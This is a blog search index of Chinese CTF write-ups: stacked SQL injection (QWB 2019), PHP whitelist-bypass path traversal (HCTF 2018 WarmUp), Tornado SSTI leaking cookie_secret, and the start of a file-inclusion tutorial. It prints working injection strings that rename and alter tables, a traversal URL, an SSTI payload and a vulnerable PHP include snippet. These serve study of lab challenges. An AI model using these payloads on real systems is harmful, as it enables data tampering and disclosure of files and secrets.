<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF系列 // [强网杯 2019] 随便注</title>
      <link href="/2020/09/23/BUUCTF%E7%B3%BB%E5%88%97-%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
      <url>/2020/09/23/BUUCTF%E7%B3%BB%E5%88%97-%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题知识点：<strong><em>SQL堆叠注入</em></strong></p><a id="more"></a><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目，很明显的提示我们应该是SQL注入了</p><p><img src="https://img-blog.csdnimg.cn/20200923172823761.png#pic_center" alt="在这里插入图片描述"><br>So，先按照一般的流程，尝试基本的探测姿势</p><h5 id="1-探测有无注入"><a href="#1-探测有无注入" class="headerlink" title="1. 探测有无注入"></a>1. 探测有无注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39;报错</span><br><span class="line">1&#39;--+报错</span><br><span class="line">1&#39;#正常有回显</span><br><span class="line">1&#39; and 1&#x3D;1#正常有回显</span><br><span class="line">1&#39; and 1&#x3D;2#正常无回显</span><br></pre></td></tr></table></figure><p>可知存在注入，且 <code>--+</code> 注释被过滤，<code>#</code> 注释可用</p><h5 id="2-尝试获取列数"><a href="#2-尝试获取列数" class="headerlink" title="2. 尝试获取列数"></a>2. 尝试获取列数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1#正常有回显</span><br><span class="line">1&#39; order by 2#正常有回显</span><br><span class="line">1&#39; order by 3#  报错</span><br></pre></td></tr></table></figure><p>用 <code>order by</code> 语句判断出有两个字段</p><h5 id="3-尝试联合查询"><a href="#3-尝试联合查询" class="headerlink" title="3. 尝试联合查询"></a>3. 尝试联合查询</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1, databaes()#报错</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200923175038360.png#pic_center" alt="在这里插入图片描述"><br>发现以上关键字均被过滤无法使用，故接下来考虑堆叠注入</p><h3 id="堆叠注入（Stacked-injections）"><a href="#堆叠注入（Stacked-injections）" class="headerlink" title="堆叠注入（Stacked injections）"></a>堆叠注入（Stacked injections）</h3><p>顾名思义，堆叠注入就是多条 SQL 语句一起执行。在 SQL 中，分号 <code>;</code> 用来表示一条 SQL 语句的结束。堆叠注入的使用方法就是使用分号结束一条 SQL 语句后继续构造下一条语句。</p><p><img src="https://img-blog.csdnimg.cn/20200923175859235.png#pic_center" alt="在这里插入图片描述"></p><h5 id="1-查询所有数据库"><a href="#1-查询所有数据库" class="headerlink" title="1. 查询所有数据库"></a>1. 查询所有数据库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200923180545886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="2-查询所有表"><a href="#2-查询所有表" class="headerlink" title="2. 查询所有表"></a>2. 查询所有表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200923180649780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到存在两张表，分别查看其中的所有列</p><h5 id="3-查询表中所有列"><a href="#3-查询表中所有列" class="headerlink" title="3. 查询表中所有列"></a>3. 查询表中所有列</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;show columns from words;#查询words表中所有的列</span><br><span class="line">-1&#39;;show columns from &#96;1919810931114514&#96;;# 查询1919810931114514表中所有的列</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200923181019685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>Notice：</strong><br><strong>字符串为表名操作时要加反引号( ` )</strong></p><p><img src="https://img-blog.csdnimg.cn/20200923181124920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>因为查询出的结果是一个数字加一个字符串，观察两张表的结构，不难判断出 words 应该是默认查询的表，数字与 id 相对应，字符串则对应着 data；传入的参数对应着查询语句中的 id 字段<br><img src="https://img-blog.csdnimg.cn/20200923181838600.png#pic_center" alt="在这里插入图片描述"><br>由查询1919810931114514表所得到的结果可知，flag 应该就在其 flag 字段中，所以只要读取此字段内的数据即可拿到 flag，But 由于 select 字段被过滤了，所以无法直接对此字段进行查询</p><p>However，通过先前的测试我们知道，默认查询的表为 words 表，即后台查询语句类似下列语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from words where id &#x3D; &#39;1&#39;;</span><br></pre></td></tr></table></figure><p>加上本题没有禁用 <code>rename</code> 和 <code>alert</code> 关键字，因此我们可以通过修改表结构的方法来得到 flag 。</p><p>我们可以将 words 表名改为 words1 ，再将数字名表改为 words ，这样默认查询的表就变成了数字名表了，由于数字名表没有 id 列，在查询的时候会产生错误，故还需将其 flag 字段名改为 id 或者直接添加 id 字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</span><br></pre></td></tr></table></figure><p>接下来只需爆出 words 表中的所有字段即可拿到 flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1 &#x3D; 1#</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200923184302219.png#pic_center" alt="在这里插入图片描述"><br><strong>PS：</strong></p><p><img src="https://img-blog.csdnimg.cn/20200923184404534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF系列 // [HCTF 2018] WarmUp</title>
      <link href="/2020/09/21/BUUCTF%E7%B3%BB%E5%88%97-%5BHCTF-2018%5D-WarmUp/"/>
      <url>/2020/09/21/BUUCTF%E7%B3%BB%E5%88%97-%5BHCTF-2018%5D-WarmUp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题知识点：<strong><em>PHP 的代码审计 &amp; 目录穿越</em></strong></p><a id="more"></a><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开题目页面，可以看到一个滑稽表情，除此之外没有明显的提示。F12查看网页源码，发现提示 ‘source.php’</p><p><img src="https://img-blog.csdnimg.cn/20200921085431456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问该文件，得到题目源码</p><p><img src="https://img-blog.csdnimg.cn/20200921085752444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>对代码进行初步的分析如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span>//定义 <span class="title">emmm</span>类</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span>//定义 <span class="title">checkFile</span>方法</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;<span class="comment">//判断 page变量是否存在且为字符串</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">//判断 page变量是否为 whitelist数组中的字符串</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(<span class="comment">//如果 page变量和白名单数组中的字符串不相同，则获取基于 page变量得到的新变量 _page以供再次进行判断</span></span><br><span class="line">                $page,<span class="comment">//mb_substr函数返回一个字符串的子串，第二三个参数指定该子串在字符串中的起始位置</span></span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)<span class="comment">//首先在 page字符串的结尾拼接一个问号，再利用 mb_strpos函数返回问号在 page字符串中首次出现的位置</span></span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">           $_page = urldecode($page);<span class="comment">//对 page变量值进行URL解码</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])<span class="comment">//判断 file值是否为空</span></span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])<span class="comment">//判断 file值是否为字符串</span></span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])<span class="comment">//判断 file值是否能够通过 checkFile函数校验</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];<span class="comment">//包含 file文件</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;<span class="comment">//滑稽图片</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由初步的分析可知，本题需要我们绕过对 file变量值的校验，然后即可通过包含 file文件得到其中内容</p><p>观察代码，可发现在 whitelist数组中提示我们访问 ‘hint.php’ ，访问该文件即可得到 flag所在文件的线索</p><p><img src="https://img-blog.csdnimg.cn/20200921151237183.png#pic_center" alt="在这里插入图片描述"><br>综上所述，多次尝试目录穿越，最终构造 URL如下，得到 flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">......source.php?file&#x3D;hint.php?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200921152134644.png#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF系列 // Web | easytornado</title>
      <link href="/2020/08/08/XCTF%E7%B3%BB%E5%88%97-Web-easytornado/"/>
      <url>/2020/08/08/XCTF%E7%B3%BB%E5%88%97-Web-easytornado/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题涉及到的知识点有，<strong><em>Tornado 的 SSTI 漏洞</em></strong>、<strong><em>Tornado 中的 cookie_secret 值</em></strong> 以及 <strong><em>Python3 中的 hashlib 模块</em></strong>。</p><a id="more"></a><p><strong>首先大概的介绍一下 Tornado 的相关概念。</strong></p><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>Tornado 是使用 Python 开发的全栈式（full-stack）Web 框架和异步网络库。与以前提到过的 Flask 一样都是 Python 的一种 Web 开发框架。</p><h3 id="Tornado-render-模板注入"><a href="#Tornado-render-模板注入" class="headerlink" title="Tornado render 模板注入"></a>Tornado render 模板注入</h3><p>Tornado render 是 Python 中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对 render 内容可控，不仅可以注入 XSS 代码，而且还可以通过 {{}} 进行传递变量和执行简单的表达式。模板注入的相关概念在以前的文章中已经提到过，在这里就不再赘述。</p><p>由于本人对于这些框架的了解几乎为零…. So，关于 SSTI in Tornado 的深入分析可以参考博客 <a href="https://xz.aliyun.com/t/2908" target="_blank" rel="noopener">Python中从服务端模板注入到沙盒逃逸的源码探索 (一)</a> 或者 <a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html" target="_blank" rel="noopener">python SSTI tornado render模板注入</a>（PS. 这篇博客写的一点都不通畅….读起来好费力啊….）</p><p><strong>接下来具体分析分析题目。</strong></p><p>打开题目可以看到有三个文件，逐一访问，内容如下：</p><ol><li>/flag.txt<br><img src="https://img-blog.csdnimg.cn/20200808135339215.png" alt="在这里插入图片描述"></li><li>/welcome.txt<br><img src="https://img-blog.csdnimg.cn/20200808135432473.png" alt="在这里插入图片描述"></li><li>/hints.txt<br><img src="https://img-blog.csdnimg.cn/20200808135454392.png" alt="在这里插入图片描述"></li></ol><p>既然第一个文件中的内容提示我们 flag 在 /fllllllllllllag 里面，那么不妨先试着直接访问该文件看看。</p><p><img src="https://img-blog.csdnimg.cn/20200808140903634.png" alt="在这里插入图片描述"><br>可以看到页面返回了错误提示，观察该报错页面的 URL， 注意到 URL 中 msg 的值为 Error，与页面的显示内容相同。故可以尝试修改 msg 的值观察其回显。</p><p><img src="https://img-blog.csdnimg.cn/20200808205813497.png" alt="在这里插入图片描述"><br>此时结合第二个文件中的提示 render，考虑此处存在 Tornado 的服务端模板注入攻击，继续尝试几个例子确认一下。</p><p><img src="https://img-blog.csdnimg.cn/20200808210416704.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200808210440224.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200808210706901.png" alt="在这里插入图片描述"><br>发现确实存在 SSTI ，但是部分注入被过滤了。</p><p>接下来看看第三个文件中的提示，<code>md5(cookie_secret+md5(filename))</code>。观察题目所给三个文件的 URL 的格式，不难发现，该表达式的结果应该是对应着 URL 中的 filehash 参数的值。既然存放 flag 的文件名我们已经知道了，那么我们只需要得到相应的 filehash 参数的值，我们就可以构造 URL 进而得到 flag。</p><p>观察该表达式，filename 是我们已知的，所以我们只要知道 cookie_secret 所对应的值，便可以计算出该表达式的结果。</p><p>那么 cookie_secret 又是什么东西呢，在 Tornado 中，通过在 tornado.web.Application 中添加 cookie_secret 参数，我们就可以使用 set_secure_cookie() 和 get_secure_cookie() 函数来发送和取得浏览器的 cookies ，借助该参数可以对 cookie 进行简易加密以防止 Cookie 被恶意篡改。关于 <strong>Tornado 的 cookie_secret 值</strong> 可以参考博客 <a href="https://www.cnblogs.com/zhanghongfeng/p/8182909.html" target="_blank" rel="noopener">tornado安全应用之cookie</a>  或者 <a href="https://www.cnblogs.com/liyqiang/p/7140530.html" target="_blank" rel="noopener">tornado中的cookie</a></p><p>Tornado 文档中的相关内容如下：</p><p><img src="https://img-blog.csdnimg.cn/20200808220146516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>至于要如何获取到 cookie_secret 的值，emmmmm，由于没有学习过相关框架的语法，这里只好直接用大佬的 WP 里面的结论了，参考博客传送门 <a href="https://www.jianshu.com/p/c4070d6f4249" target="_blank" rel="noopener">[护网杯 2018]easy_tornado</a> 及 <a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">Tornado小记 – 模板中的Handler</a>，相关摘要如下：</p><p><img src="https://img-blog.csdnimg.cn/20200808221346401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>简单总结一下就是，cookie_secret 是存在于 settings 中的，settings 又作为参数传入了 Application 构造函数，因此可以通过 self.application.settings 来获取到 cookie_secret。又因为根据官方文档， RequestHandler.settings 的别名是 self.application.settings，且 handler 指向处理当前这个页面的 RequestHandler 对象，故最终的效果就是可以直接通过 handler.settings 来得到 cookie_secret 的值。</p><p><img src="https://img-blog.csdnimg.cn/20200808221712984.png" alt="在这里插入图片描述"><br>故构造 payload，<code>msg={{handler.settings}}</code> 即可获取到 cookie_secret。</p><p><img src="https://img-blog.csdnimg.cn/20200808223412334.png" alt="在这里插入图片描述"><br>既然 filename 和 cookie_secret 我们都知道了，接下来我们就可以借助 Python 脚本来计算相应表达式的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入hashlib模块</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取一个md5加密算法对象</span></span><br><span class="line">md = hashlib.md5()</span><br><span class="line"><span class="comment">#用提供的 字节串 更新此哈希对象(hash object)的状态。</span></span><br><span class="line">md.update(<span class="string">'/fllllllllllllag'</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment">#NOTICE：</span></span><br><span class="line"><span class="comment">#update()方法需要接收的参数是一个字节对象。</span></span><br><span class="line"><span class="comment">#向对象中传入字节串时，必须为编码类型。可以使用字符串前b' '的方法或使用.encode('UTF-8')的方法，使字符串变为bytes类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以十六进制数字字符串的形式返回摘要值（哈希函数计算后生成的值就叫做摘要或者摘要值）</span></span><br><span class="line">fact = md.hexdigest()</span><br><span class="line"></span><br><span class="line">md = hashlib.md5()</span><br><span class="line">md.update((<span class="string">'bc79458a-593f-49be-8e91-887c85856f99'</span> + fact).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(md.hexdigest())</span><br></pre></td></tr></table></figure><p>关于 Python 中的 hashlib 模块可以参考博客 <a href="https://www.cnblogs.com/sly27/p/8716626.html" target="_blank" rel="noopener">Python hashlib模块</a>、<a href="https://www.cnblogs.com/yang-wei/p/9985099.html" target="_blank" rel="noopener">python常用模块之hashlib模块</a> 以及  <a href="https://blog.csdn.net/weixin_42193179/article/details/104520896" target="_blank" rel="noopener">python3 hashlib.md5()_update()_digest()_hexdigest().py</a>  </p><p>现在 filename 和 filehash 的值我们就都得到了，接下来按照题目的格式构造相应的 URL 即可得到 flag。</p><p><img src="https://img-blog.csdnimg.cn/20200808231552285.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSTI(服务端模板注入) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全 // 文件包含漏洞（File Inclusion）</title>
      <link href="/2020/07/30/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion%EF%BC%89/"/>
      <url>/2020/07/30/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88File%20Inclusion%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这周第一次尝试了正经的 CTF 比赛， <del>虽然吧一题也没做出来</del>  ，但总归也是有所收获。<br>路漫漫其修远兮，吾将上下而求索。Go Fight !</p><a id="more"></a><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含，简单来说就是开发人员在开发中为了方便以及提高代码的重用性和灵活性，会将在多个地方重复使用到的代码或者函数等单独写到一个文件中，在需要用到的地方直接调用此文件，而无需重复编写，包含后的文件即相当于将被包含的整个文件内容复制到了包含处。<br><strong>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</strong>　　</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>程序开发人员一般希望代码更灵活，所以往往将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，使得客户端可以控制变量的值，如果服务器端未对变量值进行合理地校验或者校验被绕过，那么就会导致文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。</p><h3 id="PHP-中文件包含的函数"><a href="#PHP-中文件包含的函数" class="headerlink" title="PHP 中文件包含的函数"></a>PHP 中文件包含的函数</h3><ul><li>include()<br>当使用该函数包含文件时，只有代码执行到 <code>include()</code> 函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</li><li>include_once()<br><code>include_once()</code> 语句和 <code>include()</code> 语句类似，唯一区别是如果该文件已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。<br><code>include_once()</code> 可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。</li><li>require()<br>除了处理失败的方式不同之外，<code>require()</code> 和 <code>include()</code> 几乎完全一样。<code>require()</code> 在出错时产生 (E_COMPILE_ERROR) 级别的错误，换句话说将导致脚本中止。而 <code>include()</code> 只产生警告 (E_WARNING)，脚本会继续运行。</li><li>require_once()<br><code>require_once()</code> 语句和 <code>require()</code> 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 _once 的含义与 include_once() 相同。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200730102548466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>PHP 文档中相关内容可查看链接：<a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">PHP：include</a> 及 <a href="https://www.php.net/manual/zh/function.include-once.php" target="_blank" rel="noopener">PHP：include_once</a></p><p><img src="https://img-blog.csdnimg.cn/20200730105800388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>文件包含漏洞可分为两类，本地文件包含与远程文件包含。它们的原理是相同的，不同点就是前者只能包含服务器内存在的文件，后者则可包含远程服务器内的文件。</p><h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><p>本地文件包含，Local File Inclusion，LFI。当包含的文件在服务器本地时，就形成了本地文件包含。</p><p>下面做个简单的测试来直观描述一下，在包含值可被直接控制的情况下是怎么样的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">网页源码很简单如下，file_include.php：</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file &#x3D; isset($_GET[&quot;page&quot;])?$_GET[&quot;page&quot;]:&#39;homepage.php&#39;;</span><br><span class="line">include($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200730121905846.png" alt="在这里插入图片描述"><br>为了更加方便直观，我们可以在网页源码目录下随便新建几个不同类型的文件以供测试，结果如下。</p><p>PS:文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要文件被包含，其内容就会被包含文件所包含，并以当前服务器脚本语言执行。如果包含的文件内容不符合当前脚本语言语法的，会直接将文件内容输出。</p><p><img src="https://img-blog.csdnimg.cn/20200730123301329.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200730123352102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" 